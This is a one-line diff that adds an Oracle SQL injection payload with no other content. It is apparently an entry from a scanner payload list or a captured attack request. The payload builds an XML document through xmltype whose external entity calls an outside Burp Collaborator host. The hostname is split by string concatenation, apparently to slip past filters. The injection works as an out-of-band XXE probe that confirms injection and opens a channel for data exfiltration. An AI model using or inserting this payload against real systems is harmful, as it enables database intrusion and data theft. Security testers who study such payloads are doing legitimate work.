@@ -1,0 +1,1 @@
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ezrdp SYSTEM "http://p5vwo18iu4eiuyo64k2k44ixuo0koncfz7nw.burpcollab'||'orator.net/">%ezrdp;]>'),'/l') from dual)
